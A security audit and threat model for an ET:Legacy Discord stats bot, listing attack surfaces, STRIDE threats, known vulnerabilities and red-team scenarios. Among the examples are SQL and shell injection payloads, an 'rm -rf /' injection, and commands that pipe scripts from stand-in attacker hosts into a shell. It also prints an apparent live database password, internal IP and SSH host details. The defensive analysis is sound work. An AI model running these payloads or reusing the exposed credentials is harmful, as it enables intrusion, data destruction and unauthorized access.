# ET:Legacy Discord Bot - Comprehensive Security Audit & Threat Model

**Document Version:** 1.0
**Last Updated:** 2025-12-14
**Audit Status:** IN PROGRESS
**Security Posture:** UNTRUSTED UNTIL PROVEN SECURE

---

## Executive Summary

**Purpose of This Document:**
This is a living security audit document designed for continuous study and improvement. Unlike typical "we tested ourselves" approaches, this document:

1. **Assumes everything is vulnerable until proven otherwise**
2. **Maps the complete attack surface** (all external inputs)
3. **Documents ALL potential attack vectors** (known and theoretical)
4. **Identifies trust boundaries** and what we're trusting (often incorrectly)
5. **Provides red team attack scenarios** (how a real attacker would approach this)
6. **Documents defense gaps** (what we DON'T protect against)

**Current Security Assessment:**

- **Overall Risk Level:** MEDIUM-HIGH
- **Production Ready:** NO (security hardening required)
- **External Facing:** YES (Discord API, SSH, PostgreSQL)
- **Privilege Level:** HIGH (file system access, database access, server control)

---

## Table of Contents

1. [Attack Surface Mapping](#attack-surface-mapping)
2. [Trust Boundaries & Assumptions](#trust-boundaries--assumptions)
3. [Threat Model (STRIDE Analysis)](#threat-model-stride-analysis)
4. [Entry Points (External Inputs)](#entry-points-external-inputs)
5. [Known Vulnerabilities](#known-vulnerabilities)
6. [Potential Vulnerabilities (Untested)](#potential-vulnerabilities-untested)
7. [Red Team Attack Scenarios](#red-team-attack-scenarios)
8. [Defense Mechanisms](#defense-mechanisms)
9. [Security Gaps (What We DON'T Protect)](#security-gaps-what-we-dont-protect)
10. [Privilege Escalation Paths](#privilege-escalation-paths)
11. [Data Flow Analysis](#data-flow-analysis)
12. [Secrets Management](#secrets-management)
13. [Real-World Exploitation Scenarios](#real-world-exploitation-scenarios)
14. [Security Checklist (Continuous)](#security-checklist-continuous)
15. [Testing Strategy (Independent Verification)](#testing-strategy-independent-verification)

---

## Attack Surface Mapping

### Definition

**Attack Surface:** Every point where an attacker can input data or interact with the system.

### Complete Attack Surface

```python
┌─────────────────────────────────────────────────────────────────┐
│                     EXTERNAL WORLD (UNTRUSTED)                  │
└─────────────────────────────────────────────────────────────────┘
                                    │
    ┌───────────────────────────────┼───────────────────────────────┐
    │                               │                               │
    ▼                               ▼                               ▼
┌─────────┐                   ┌──────────┐                   ┌──────────┐
│ Discord │                   │   VPS    │                   │  Local   │
│   API   │                   │  Server  │                   │  Files   │
└─────────┘                   └──────────┘                   └──────────┘
    │                               │                               │
    ├─ Webhook messages             ├─ SSH connection              ├─ .env file
    ├─ Bot commands (!*)            ├─ Stats files                 ├─ Config files
    ├─ User messages                ├─ RCON commands               ├─ Database files
    ├─ Channel names                └─ VPS filesystem              └─ Logs
    ├─ User nicknames                                                   │
    └─ Embed content                                                    │
                                                                        │
    ┌───────────────────────────────┼───────────────────────────────┐
    │                               │                               │
    ▼                               ▼                               ▼
┌──────────────┐              ┌──────────────┐              ┌──────────────┐
│  PostgreSQL  │              │  File Parser │              │  Python      │
│   Database   │              │   (Stats)    │              │  Runtime     │
└──────────────┘              └──────────────┘              └──────────────┘
    │                               │                               │
    ├─ SQL queries                  ├─ Stats parsing               ├─ Code execution
    ├─ Connection strings           ├─ Line parsing                ├─ Import statements
    └─ Credentials                  └─ Regex matching              └─ Environment vars
```python

### Attack Surface Inventory

| # | Entry Point | Data Type | Trust Level | Input Validation | Tested? |
|---|-------------|-----------|-------------|------------------|---------|
| 1 | Discord webhook messages | JSON | UNTRUSTED | Webhook ID whitelist, filename regex | ✅ |
| 2 | Discord bot commands | Text | UNTRUSTED | Command parsing | ❌ |
| 3 | Discord user nicknames | Text | UNTRUSTED | None | ❌ |
| 4 | Discord channel names | Text | UNTRUSTED | None | ❌ |
| 5 | Discord embed content | Text/HTML | UNTRUSTED | None | ❌ |
| 6 | Stats files (VPS) | Text | SEMI-TRUSTED | Filename only | ⚠️ |
| 7 | SSH connection | Network | SEMI-TRUSTED | Host key (AutoAdd) | ❌ |
| 8 | RCON commands | Text | TRUSTED | None | ❌ |
| 9 | .env file | Text | TRUSTED | None | ❌ |
| 10 | PostgreSQL connection | Network | TRUSTED | Password auth | ❌ |
| 11 | File system paths | Text | TRUSTED | None | ❌ |
| 12 | Python imports | Code | TRUSTED | None | ❌ |
| 13 | Environment variables | Text | TRUSTED | None | ❌ |
| 14 | Command-line arguments | Text | TRUSTED | None | ❌ |
| 15 | Log files | Text | OUTPUT | None | ❌ |

**Key:**

- ✅ = Tested and validated
- ⚠️ = Partially tested (only filename, not content)
- ❌ = NOT tested or validated

---

## Trust Boundaries & Assumptions

### What We Trust (DANGEROUS ASSUMPTIONS)

**⚠️ CRITICAL: These are assumptions, not verified security guarantees!**

| What We Trust | Why We Trust It | Is This Valid? | Risk Level |
|---------------|-----------------|----------------|------------|
| Discord webhook IDs are secret | Configured externally | ❌ NO - IDs can be extracted from webhook URLs in logs/errors | HIGH |
| SSH server is legitimate (VPS) | We control it | ⚠️ MAYBE - Could be compromised, MITM possible | MEDIUM |
| Stats files from VPS are benign | Generated by game server | ❌ NO - VPS could be compromised | HIGH |
| Discord bot token is secret | Stored in .env | ⚠️ MAYBE - Depends on file permissions | MEDIUM |
| PostgreSQL is on trusted network | Local network | ⚠️ MAYBE - Network could be compromised | MEDIUM |
| Python dependencies are safe | pip install from PyPI | ❌ NO - Supply chain attacks possible | HIGH |
| File system permissions are correct | OS defaults | ❌ NO - Never verified | MEDIUM |
| Database credentials are rotated | Manual process | ❌ NO - Never rotated | LOW |
| Logs don't contain secrets | Code review | ❌ NO - Never audited | MEDIUM |
| Discord API is secure | Discord's responsibility | ✅ YES - Reasonable assumption | LOW |

### Trust Boundary Violations

**Scenarios where untrusted data crosses into trusted context:**

1. **Webhook message → File system**
   - Untrusted filename → SSH download path
   - **Mitigation:** Filename regex validation
   - **Gap:** Content not validated

2. **Stats file content → Database**
   - Untrusted stats data → SQL INSERT
   - **Mitigation:** Parameterized queries
   - **Gap:** Data ranges not validated

3. **Discord username → Database**
   - Untrusted display name → SQL query
   - **Mitigation:** Parameterized queries
   - **Gap:** No length limits, encoding issues

4. **Discord command → OS command**
   - User input (!server_restart) → subprocess.run()
   - **Mitigation:** Admin channel check
   - **Gap:** Channel ID can be spoofed

5. **VPS SSH → Local file system**
   - Remote files → local_stats/ directory
   - **Mitigation:** None
   - **Gap:** Symlink attacks, file overwrites

---

## Threat Model (STRIDE Analysis)

### STRIDE Framework

**S**poofing, **T**ampering, **R**epudiation, **I**nformation Disclosure, **D**enial of Service, **E**levation of Privilege

### Threat Matrix

| Threat Category | Threat Scenario | Likelihood | Impact | Risk | Mitigated? |
|-----------------|-----------------|------------|--------|------|------------|
| **SPOOFING** |
| Webhook ID spoofing | Attacker creates webhook with similar ID | MEDIUM | HIGH | HIGH | ⚠️ PARTIAL |
| SSH MITM | Attacker intercepts SSH connection | LOW | CRITICAL | MEDIUM | ❌ NO |
| Discord user impersonation | Fake admin via nickname | LOW | MEDIUM | LOW | ❌ NO |
| **TAMPERING** |
| Stats file tampering | Attacker modifies stats before download | MEDIUM | MEDIUM | MEDIUM | ❌ NO |
| Database tampering | SQL injection via bot commands | LOW | CRITICAL | LOW | ✅ YES |
| Log tampering | Attacker modifies logs to hide tracks | LOW | LOW | LOW | ❌ NO |
| **REPUDIATION** |
| Denied admin actions | Admin claims they didn't run command | LOW | LOW | LOW | ⚠️ PARTIAL |
| Denied file uploads | VPS claims it didn't send file | LOW | LOW | LOW | ❌ NO |
| **INFORMATION DISCLOSURE** |
| Webhook URL leakage | URL in logs/errors exposes secret | MEDIUM | HIGH | MEDIUM | ❌ NO |
| Database credentials in logs | Connection errors leak password | LOW | CRITICAL | MEDIUM | ❌ NO |
| Stats data exposure | Public Discord channels | HIGH | LOW | LOW | ✅ ACCEPTED |
| .env file exposure | File permissions too open | LOW | CRITICAL | MEDIUM | ❌ NO |
| **DENIAL OF SERVICE** |
| Webhook spam | 1000s of triggers exhaust bot | MEDIUM | MEDIUM | MEDIUM | ✅ YES |
| Huge stats file | 1GB file crashes parser | LOW | MEDIUM | LOW | ❌ NO |
| Database connection exhaustion | Too many connections | LOW | MEDIUM | LOW | ⚠️ PARTIAL |
| **ELEVATION OF PRIVILEGE** |
| Admin command bypass | Non-admin runs !server_restart | LOW | CRITICAL | MEDIUM | ⚠️ PARTIAL |
| File system escape | Path traversal via filename | MEDIUM | HIGH | HIGH | ✅ YES |
| RCE via stats parsing | Malicious stats file executes code | LOW | CRITICAL | MEDIUM | ❌ NO |

**Risk Calculation:** Likelihood × Impact
**Mitigation Status:**

- ✅ YES = Fully mitigated
- ⚠️ PARTIAL = Partially mitigated
- ❌ NO = Not mitigated

---

## Entry Points (External Inputs)

### 1. Discord Webhook Messages

**Entry Point:** `bot/ultimate_bot.py:_handle_webhook_trigger()`

**Data Flow:**

```text
Discord → Webhook → Bot → Filename extraction → SSH download → Parser → Database
```python

**Input Fields:**

- `message.webhook_id` - Numeric string (18-20 digits)
- `message.content` - Text containing filename in backticks
- `message.author.name` - Webhook username
- `message.embeds` - Optional embed content

**Validation:**

- ✅ Webhook ID whitelist check
- ✅ Filename regex validation
- ✅ Username check
- ❌ Embed content NOT validated
- ❌ Message length NOT limited

**Attack Vectors:**

| Attack | Payload | Expected Defense | Actual Defense |
|--------|---------|------------------|----------------|
| Path traversal | `../../../etc/passwd.txt` | Filename regex | ✅ BLOCKED |
| Command injection | `` map`whoami`-round-1.txt `` | Filename regex | ✅ BLOCKED |
| Null byte | `map\x00-round-1.txt` | Character check | ✅ BLOCKED |
| Huge filename | 10,000 char filename | Length check | ✅ BLOCKED |
| Webhook ID fuzzing | Non-numeric webhook ID | Whitelist check | ✅ BLOCKED |
| Unicode normalization | `map\u202ename-round-1.txt` | ? | ❌ UNKNOWN |
| Homograph attack | Cyrillic 'a' instead of Latin 'a' | ? | ❌ UNKNOWN |

**Untested Scenarios:**

- What happens if webhook sends 1000 embeds?
- Can we overflow the Discord message queue?
- What if webhook_id is a string that looks numeric but isn't?

---

### 2. Discord Bot Commands

**Entry Point:** `bot/cogs/*.py` - All command handlers

**Data Flow:**

```text
Discord user → !command args → Command parser → Bot logic → Database/Server
```python

**Input Fields:**

- Command name (!stats, !server_restart, etc.)
- Command arguments (player names, dates, etc.)
- User ID
- Channel ID
- Guild ID

**Validation:**

- ⚠️ Admin check (channel-based only)
- ❌ Argument parsing NOT validated
- ❌ Length limits NOT enforced
- ❌ SQL injection in custom queries?

**Attack Vectors:**

| Command | Attack Payload | Risk | Tested? |
|---------|---------------|------|---------|
| !stats | `!stats '; DROP TABLE sessions;--` | SQL injection | ❌ |
| !find_player | `!find_player $(whoami)` | Command injection | ❌ |
| !server_restart | `!server_restart && rm -rf /` | Command injection | ❌ |
| !link | `!link <script>alert(1)</script>` | XSS (stored in DB) | ❌ |
| !setname | `!setname $'\x00\x00\x00\x00'` | Null bytes | ❌ |
| Any | 10MB command argument | DoS (memory) | ❌ |

**Dangerous Commands (Require Admin):**

- `!server_start` - Executes shell command
- `!server_stop` - Executes shell command
- `!server_restart` - Executes shell command
- `!map_change` - Sends RCON command
- `!say` - Sends RCON command
- `!kick` - Sends RCON command

**Admin Check:** Only verifies channel ID, NOT user roles!

---

### 3. Stats File Parsing

**Entry Point:** `bot/community_stats_parser.py:parse_stats_file()`

**Data Flow:**

```text
VPS stats file → SSH download → Local file → Parser → Database
```python

**Input:** Raw text file (supposedly ET:Legacy stats format)

**Validation:**

- ✅ Filename validated
- ❌ File size NOT checked (DOS via huge file)
- ❌ Line count NOT limited
- ❌ Content format NOT pre-validated
- ❌ Character encoding NOT enforced (uses errors='ignore')

**Attack Vectors:**

| Attack | Payload | Risk | Impact |
|--------|---------|------|--------|
| Huge file | 1GB stats file | DoS | Bot hangs/crashes |
| Infinite lines | 10 million line file | DoS | Memory exhaustion |
| Malformed encoding | UTF-8 with invalid sequences | Data corruption | Silent data loss |
| Regex DoS | Filename with catastrophic backtracking | DoS | Regex hangs |
| Integer overflow | Kill count: 9999999999999 | Data corruption | Database error |
| Negative values | Damage: -999999 | Logic error | Invalid stats |
| Code injection | Player name: `__import__('os').system('whoami')` | RCE | ? |
| Format string | Player name: `%s%s%s%s%s` | Information disclosure | ? |

**Parser Assumptions:**

- File is valid ET:Legacy format
- Player names don't contain malicious content
- Numbers are reasonable (0-999 range)
- File terminates properly (no truncation)

**None of these assumptions have been validated!**

---

### 4. SSH Connection (VPS → Bot)

**Entry Point:** `bot/automation/ssh_handler.py:SSHHandler`

**Data Flow:**

```text
Bot → SSH client → Network → VPS SSHD → File transfer
```yaml

**Authentication:**

- Private key: `~/.ssh/etlegacy_bot`
- Host: `puran.hehe.si:48101`
- User: `et`
- Host key verification: **AutoAddPolicy** (DANGEROUS!)

**Attack Vectors:**

| Attack | Scenario | Risk | Mitigated? |
|--------|----------|------|------------|
| MITM | Attacker intercepts SSH connection | CRITICAL | ❌ NO |
| Compromised VPS | VPS sends malicious stats files | HIGH | ❌ NO |
| Private key theft | Attacker steals ~/.ssh/etlegacy_bot | CRITICAL | ⚠️ File perms |
| DNS hijacking | puran.hehe.si resolves to attacker IP | HIGH | ❌ NO |
| SSH key brute force | Attacker guesses weak passphrase | MEDIUM | ❓ Key strength unknown |
| Downgrade attack | Force SSH to weak cipher | MEDIUM | ❌ NO |

**Current SSH Configuration:**

```python
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # ACCEPTS ANY HOST KEY!
```python

**This means:**

- First connection: Accepts ANY server (even attacker's)
- Subsequent connections: Checks known_hosts, but accepts new keys
- MITM attack trivial on first connection

---

### 5. Database Connection

**Entry Point:** `bot/core/database_adapter.py`

**Connection String:**

```python
postgres://etlegacy_user:etlegacy_secure_2025@192.168.64.116:5432/etlegacy
```yaml

**Attack Vectors:**

| Attack | Scenario | Risk | Mitigated? |
|--------|----------|------|------------|
| Credential theft | .env file exposed | CRITICAL | ⚠️ File perms |
| Network sniffing | Password sent in plaintext | MEDIUM | ❓ SSL/TLS? |
| Connection exhaustion | Bot opens 1000s of connections | MEDIUM | ⚠️ Pool limits |
| SQL injection | Malicious input → SQL query | CRITICAL | ✅ Parameterized |

**Parameterized Queries (GOOD):**

```python
await conn.execute(
    "INSERT INTO sessions (map_name) VALUES ($1)",
    map_name  # Safe - parameter binding
)
```text

**String Formatting (DANGEROUS - if used anywhere):**

```python
# NEVER DO THIS:
query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
```python

**Audit Required:** Search entire codebase for string formatting in SQL queries.

---

## Known Vulnerabilities

### CRITICAL (Immediate Fix Required)

**1. SSH Man-in-the-Middle (MITM)**

- **File:** `bot/automation/ssh_handler.py`
- **Issue:** `AutoAddPolicy()` accepts ANY SSH server
- **Exploit:** Attacker intercepts connection on first connect
- **Impact:** Attacker can send malicious stats files
- **Fix:** Enable strict host key checking, pin host key

**2. No File Size Limits**

- **File:** `bot/ultimate_bot.py:_process_webhook_triggered_file()`
- **Issue:** Downloads files of ANY size
- **Exploit:** 10GB stats file exhausts disk/memory
- **Impact:** DoS (bot crashes)
- **Fix:** Check file size before download (10MB max)

**3. No Parser Timeout**

- **File:** `bot/community_stats_parser.py:parse_stats_file()`
- **Issue:** Parser can run forever on malformed file
- **Exploit:** Huge/malformed file causes infinite loop
- **Impact:** DoS (bot hangs)
- **Fix:** Add 30-second timeout to parsing

### HIGH (Fix Soon)

**4. Admin Commands Use Channel ID Only**

- **File:** `bot/cogs/server_control.py`
- **Issue:** Admin check only verifies channel, not user role
- **Exploit:** Anyone posting in admin channel = admin
- **Impact:** Unauthorized server control
- **Fix:** Check Discord user roles (Administrator, Moderator)

**5. No Webhook Signature Validation**

- **File:** `bot/ultimate_bot.py:_handle_webhook_trigger()`
- **Issue:** Only checks webhook ID, no HMAC signature
- **Exploit:** If webhook ID leaks, attacker can spoof
- **Impact:** Malicious file processing
- **Fix:** Implement HMAC-SHA256 signature verification

**6. Secrets in Logs**

- **Files:** All files using `logger.error()`, `logger.debug()`
- **Issue:** Never audited logs for secret leakage
- **Exploit:** Database password in connection error logs
- **Impact:** Credential theft
- **Fix:** Audit all log statements, redact secrets

### MEDIUM (Fix When Possible)

**7. No Rate Limiting on Bot Commands**

- **Files:** `bot/cogs/*.py`
- **Issue:** Users can spam commands
- **Exploit:** Flood bot with !stats requests
- **Impact:** DoS (CPU/DB exhaustion)
- **Fix:** Rate limit per-user per-command

**8. Unicode Normalization Not Enforced**

- **Files:** All user input processing
- **Issue:** Homograph attacks, encoding issues
- **Exploit:** Player name "admin" vs "аdmin" (Cyrillic)
- **Impact:** Display name spoofing
- **Fix:** Normalize all Unicode to NFC

**9. No Database Input Validation**

- **Files:** All database INSERT statements
- **Issue:** Invalid data ranges accepted
- **Exploit:** Negative kill counts, year 3000
- **Impact:** Data corruption, logic errors
- **Fix:** Validate all stats before INSERT

### LOW (Nice to Have)

**10. No Log Rotation**

- **Issue:** Logs grow forever
- **Impact:** Disk space exhaustion
- **Fix:** Implement log rotation (logrotate)

**11. No Audit Trail**

- **Issue:** Admin actions not logged
- **Impact:** Can't trace who did what
- **Fix:** Log all admin commands with user ID

---

## Potential Vulnerabilities (Untested)

**These are THEORETICAL but plausible attacks that have NOT been tested:**

### 1. Discord API Abuse

**Scenario:** Attacker creates 1000s of Discord accounts and floods bot with commands

**Attack Steps:**

1. Create bot farm (1000 Discord accounts)
2. Flood `!stats` command (1000 requests/second)
3. Bot exhausts database connections
4. Bot becomes unresponsive

**Likelihood:** MEDIUM
**Impact:** HIGH (DoS)
**Tested:** ❌ NO

---

### 2. Symlink Attack via VPS Compromise

**Scenario:** Attacker compromises VPS, creates symlink in stats directory

**Attack Steps:**

1. Compromise VPS (separate vulnerability)
2. Create symlink: `ln -s /etc/shadow 2025-12-14-120000-goldrush-round-1.txt`
3. Bot downloads "/etc/shadow" thinking it's stats file
4. Parser leaks sensitive data in error messages

**Likelihood:** LOW
**Impact:** CRITICAL
**Tested:** ❌ NO

---

### 3. Dependency Confusion / Supply Chain

**Scenario:** Attacker uploads malicious package to PyPI

**Attack Steps:**

1. Identify internal package name (e.g., "etlegacy-stats")
2. Upload malicious package with same name to PyPI
3. `pip install` downloads malicious package
4. Package executes backdoor on import

**Likelihood:** LOW
**Impact:** CRITICAL (RCE)
**Tested:** ❌ NO

---

### 4. Race Condition in File Processing

**Scenario:** Bot crashes between download and marking file as processed

**Attack Steps:**

1. Trigger file download
2. Kill bot mid-processing (timing attack)
3. Bot restarts, re-processes same file
4. Duplicate stats in database

**Likelihood:** LOW
**Impact:** LOW (data duplication)
**Tested:** ❌ NO

---

### 5. Discord Permission Escalation

**Scenario:** Attacker manipulates Discord channel permissions

**Attack Steps:**

1. Create channel with same ID as admin channel (Discord glitch?)
2. OR: Discord admin accidentally gives attacker access to admin channel
3. Attacker now has admin commands

**Likelihood:** VERY LOW
**Impact:** CRITICAL
**Tested:** ❌ NO

---

### 6. Database Connection String Injection

**Scenario:** Attacker modifies .env file (separate compromise)

**Attack Steps:**

1. Gain write access to .env (file permission error)
2. Change `POSTGRES_HOST` to attacker's server
3. Bot connects to malicious database
4. Attacker steals all bot queries

**Likelihood:** LOW
**Impact:** CRITICAL
**Tested:** ❌ NO

---

### 7. Python Code Injection via Stats Parsing

**Scenario:** Player name contains Python code that gets eval'd

**Attack Steps:**

1. VPS compromised, creates stats file with:

   ```text

   Player: **import**('os').system('whoami')

   ```sql

2. Parser processes player name
3. If parser uses `eval()` or `exec()` anywhere...
4. Remote Code Execution

**Likelihood:** VERY LOW (if parser doesn't use eval)
**Impact:** CRITICAL (RCE)
**Tested:** ❌ NO

**Code Audit Required:** Search for `eval(`, `exec(`, `compile(`, `__import__` in parser.

---

## Red Team Attack Scenarios

**"How would a REAL attacker approach this system?"**

### Scenario 1: External Attacker (No Inside Access)

**Goal:** Gain unauthorized access to the bot or server

**Reconnaissance:**

1. Join Discord server as normal user
2. Observe bot behavior (commands, responses, timing)
3. Test rate limiting with spam commands
4. Check if bot leaks information in error messages
5. Look for command injection in !stats, !find_player
6. Monitor webhook messages for patterns

**Attack Vectors:**

1. **Webhook URL Leakage**
   - Search GitHub for accidental commits with webhook URLs
   - Check pastebin, Discord message history
   - If found: Can trigger malicious file downloads

2. **Command Injection via Bot Commands**
   - Try `!stats '; DROP TABLE sessions;--`
   - Try `!find_player $(whoami)`
   - Try `!link <script>alert(document.cookie)</script>`

3. **DoS Attacks**
   - Spam !stats 1000 times/second
   - Request huge date ranges (!stats 2000-01-01 to 2025-12-14)
   - Trigger webhook with 1GB filename

**Success Criteria:**

- SQL injection succeeds → Database access
- Command injection succeeds → Server access
- DoS succeeds → Bot offline
- Webhook trigger succeeds → Malicious file processing

---

### Scenario 2: Compromised VPS

**Goal:** Use compromised game server to attack bot

**Initial Compromise:** Assume VPS is compromised via separate vulnerability (SSH brute force, CVE, etc.)

**Attack Chain:**

1. **Reconnaissance**

   ```bash
   # On compromised VPS
   ls /home/et/.etlegacy/legacy/gamestats
   ps aux | grep python  # Find running scripts
   cat /home/et/scripts/stats_webhook_notify.py
   ```text

2. **Webhook URL Extraction**

   ```bash
   grep -r "discord.com/api/webhooks" /home/et/
   # Found: DISCORD_WEBHOOK_URL in script
   ```text

3. **Malicious Stats File Injection**

   ```bash
   # Create malicious stats file
   cat > /home/et/.etlegacy/legacy/gamestats/2025-12-14-120000-payload-round-1.txt <<EOF
   Player: '; DROP TABLE sessions;--
   Kill: 999999999999999
   Damage: -999999
   EOF
   ```yaml

4. **Trigger Webhook**
   - Webhook script auto-detects file
   - Posts to Discord
   - Bot downloads malicious file
   - Parser processes SQL injection in player name

**Escalation Paths:**

- Bot crashes → DoS
- Database corrupted → Data loss
- RCE achieved → Full compromise

---

### Scenario 3: Insider Threat

**Goal:** Discord server moderator abuses admin access

**Access Level:** Can post in admin channel

**Attack Steps:**

1. **Server Control Abuse**

   ```text

   !server_stop   # Shuts down game server
   !say "Server hacked!"  # Broadcasts message
   !kick player123  # Kicks innocent player

   ```text

2. **Data Exfiltration**

   ```text

   !stats  # View all player stats
   !leaderboard  # View all players

# Copy data manually

   ```text

3. **Privilege Escalation Attempt**

   ```text

   !server_restart && curl <http://attacker.com/backdoor.sh> | bash

# If command injection exists → RCE

   ```sql

**Mitigation:** Audit trail of all admin commands with user IDs.

---

## Defense Mechanisms

**What protections are ACTUALLY in place?**

### Layer 1: Network Security

| Defense | Status | Effectiveness | Bypassed By |
|---------|--------|---------------|-------------|
| SSH key authentication | ✅ Active | HIGH | Private key theft |
| PostgreSQL password auth | ✅ Active | MEDIUM | Credential theft |
| Discord bot token | ✅ Active | HIGH | Token leakage |
| VPS firewall | ❓ Unknown | ? | ? |
| Local firewall | ❓ Unknown | ? | ? |

---

### Layer 2: Input Validation

| Defense | Status | Effectiveness | Bypassed By |
|---------|--------|---------------|-------------|
| Filename regex | ✅ Active | HIGH | None found |
| Webhook ID whitelist | ✅ Active | MEDIUM | ID leakage |
| Rate limiting (webhooks) | ✅ Active | MEDIUM | Multiple webhooks |
| SQL parameterization | ✅ Active | HIGH | None (if used everywhere) |
| Channel-based admin check | ⚠️ Active | LOW | Channel permission abuse |

---

### Layer 3: Resource Limits

| Defense | Status | Effectiveness | Gap |
|---------|--------|---------------|-----|
| File size limits | ❌ None | N/A | Can upload 10GB file |
| Parser timeout | ❌ None | N/A | Parser can run forever |
| Connection pooling | ⚠️ Partial | MEDIUM | Max pool not enforced |
| Rate limiting (commands) | ❌ None | N/A | Can spam commands |
| Memory limits | ❌ None | N/A | Can exhaust memory |

---

### Layer 4: Monitoring & Logging

| Defense | Status | Effectiveness | Gap |
|---------|--------|---------------|-----|
| Error logging | ✅ Active | LOW | Not monitored |
| Security event logging | ⚠️ Partial | LOW | Incomplete coverage |
| Audit trail | ❌ None | N/A | Can't trace admin actions |
| Intrusion detection | ❌ None | N/A | No IDS |
| Anomaly detection | ❌ None | N/A | No monitoring |

---

## Security Gaps (What We DON'T Protect)

**Be honest about what we're NOT doing:**

### 1. No Content Validation

- ✅ We validate **filenames**
- ❌ We DON'T validate **file contents**
- **Risk:** Malicious stats file accepted if filename is valid

### 2. No User Role Checking

- ✅ We check **channel ID** for admin commands
- ❌ We DON'T check **Discord user roles**
- **Risk:** Anyone in admin channel = admin

### 3. No Secrets Rotation

- ✅ We store secrets in .env
- ❌ We NEVER rotate: database password, bot token, SSH key
- **Risk:** Long-lived credentials easier to compromise

### 4. No Dependency Auditing

- ✅ We use requirements.txt
- ❌ We NEVER audit for: CVEs, malicious packages, outdated deps
- **Risk:** Using vulnerable libraries

### 5. No Backup Verification

- ✅ We backup database (maybe)
- ❌ We NEVER test restoring backups
- **Risk:** Backups might be corrupted/unusable

### 6. No Incident Response Plan

- ❌ No documented process for: security incident, data breach, compromise
- **Risk:** Chaos during actual attack

### 7. No Security Training

- ❌ Contributors not trained on: secure coding, threat modeling, common vulns
- **Risk:** New vulnerabilities introduced

---

## Privilege Escalation Paths

**How can an attacker go from low privilege → high privilege?**

### Path 1: Discord User → Admin

```text

User joins Discord
  ↓
Discovers admin channel ID (leaked in message history?)
  ↓
Gets access to admin channel (permission misconfiguration?)
  ↓
Posts !server_restart
  ↓
Bot accepts command (no role check)
  ↓
Admin privilege achieved

```yaml

**Mitigations:**

- ❌ No user role verification
- ⚠️ Admin channel ID not secret
- ❌ No audit trail

---

### Path 2: VPS Read Access → Bot Compromise

```python

Attacker gets SSH read-only access to VPS
  ↓
Reads /home/et/scripts/stats_webhook_notify.py
  ↓
Extracts webhook URL from script
  ↓
Creates malicious stats file locally
  ↓
Triggers webhook with malicious filename
  ↓
Bot processes, RCE achieved

```yaml

**Mitigations:**

- ✅ Filename validation (blocks RCE via filename)
- ❌ No webhook signature (URL alone is enough)
- ❌ No content validation

---

### Path 3: Database Read Access → Discord Bot Token

```text

Attacker gains read access to PostgreSQL
  ↓
Searches for secrets in database
  ↓
Finds bot token in config table? (if stored)
  ↓
Uses token to impersonate bot
  ↓
Full bot access achieved

```sql

**Mitigations:**

- ❓ Unknown if bot token stored in DB
- ⚠️ Database encrypted at rest?

---

## Data Flow Analysis

**Track sensitive data from creation to destruction:**

### Discord Bot Token

```python

Creation: Discord Developer Portal
  ↓
Storage: .env file (filesystem)
  ↓
Loading: bot/config.py:Config.**init**()
  ↓
Usage: discord.Client(token=...)
  ↓
Memory: Process memory (readable via /proc/PID/environ)
  ↓
Logs: Hope not, but audit required!
  ↓
Destruction: Never (process exit only)

```bash

**Exposure Points:**

- .env file permissions (chmod 600?)
- Config loading (environment variable visible to all processes?)
- Error logs (token in traceback?)
- Memory dumps (core dumps enabled?)

---

### Database Credentials

```python

Creation: Manual (DBA sets password)
  ↓
Storage: .env file
  ↓
Loading: bot/config.py
  ↓
Usage: asyncpg.connect(host=, user=, password=)
  ↓
Network: Sent over network (encrypted?)
  ↓
Logs: Connection errors leak password?
  ↓
Destruction: Never

```yaml

**Exposure Points:**

- Network sniffing (SSL/TLS used?)
- Connection error messages
- Process environment variables

---

### SSH Private Key

```yaml

Creation: ssh-keygen (one-time)
  ↓
Storage: ~/.ssh/etlegacy_bot
  ↓
Usage: paramiko.RSAKey.from_private_key_file()
  ↓
Memory: Key loaded into process memory
  ↓
Network: Key used for authentication (never sent)
  ↓
Destruction: Never

```

**Exposure Points:**

- File permissions (chmod 600?)
- Memory dumps
- Swap files (key written to disk if swapped?)

---

## Secrets Management

**Current State: INSECURE**

### Secrets Inventory

| Secret | Storage | Rotation | Expiration | Scope |
|--------|---------|----------|------------|-------|
| Discord bot token | .env plaintext | Never | Never | Full bot access |
| PostgreSQL password | .env plaintext | Never | Never | Full DB access |
| SSH private key | ~/.ssh/ plaintext | Never | Never | VPS access |
| Webhook URL | VPS script | Never | Never | File trigger |
| RCON password | .env plaintext | Never | Never | Server control |

**Recommendations:**

1. Use secrets manager (HashiCorp Vault, AWS Secrets Manager)
2. Rotate secrets quarterly
3. Set expiration on all secrets
4. Encrypt secrets at rest

---

## Real-World Exploitation Scenarios

**Realistic attacks based on actual Discord bot breaches:**

### Scenario A: Token Leakage via Git

**Based on:** Real incidents where bot tokens committed to GitHub

**Attack Steps:**

1. Developer commits .env to GitHub by accident
2. Automated scrapers find bot token within minutes
3. Attacker uses token to:
   - Join all servers bot is in
   - Read all messages
   - Post malicious content
   - Exfiltrate data

**Likelihood:** HIGH (happens frequently)
**Impact:** CRITICAL

**Prevention:**

- .gitignore for .env
- Pre-commit hooks to block secrets
- Git secrets scanning (truffleHog)
- Token rotation immediately after commit

---

### Scenario B: Database Credentials in Logs

**Based on:** Common logging mistakes

**Attack Steps:**

1. Database connection fails (wrong password)
2. Error logged: `asyncpg.exceptions.InvalidPasswordError: password authentication failed for user "etlegacy_user" with password "etlegacy_secure_2025"`
3. Attacker with log access → full database access

**Likelihood:** MEDIUM
**Impact:** CRITICAL

**Prevention:**

- Sanitize all log output
- Never log connection strings
- Redact passwords in tracebacks

---

### Scenario C: Admin Command Abuse

**Based on:** Discord bots with weak admin checks

**Attack Steps:**

1. Attacker notices bot only checks channel ID
2. Social engineers server admin to grant channel access
3. Runs: `!server_restart && curl evil.com/backdoor | sh`
4. If command injection exists → server compromised

**Likelihood:** LOW
**Impact:** CRITICAL

**Prevention:**

- Check Discord user roles (Administrator, Moderator)
- Whitelist specific user IDs for dangerous commands
- Confirm dangerous commands with reaction emoji

---

## Security Checklist (Continuous)

**Use this for regular security reviews:**

### Daily Checks

- [ ] Review logs for security warnings
- [ ] Check for failed SSH connection attempts
- [ ] Monitor database connection counts
- [ ] Verify bot is responsive

### Weekly Checks

- [ ] Review admin command usage
- [ ] Check for new dependencies (pip freeze)
- [ ] Verify file permissions on .env and SSH keys
- [ ] Test backup restoration

### Monthly Checks

- [ ] Rotate database password
- [ ] Rotate Discord bot token
- [ ] Audit user roles and permissions
- [ ] Review and update this security document
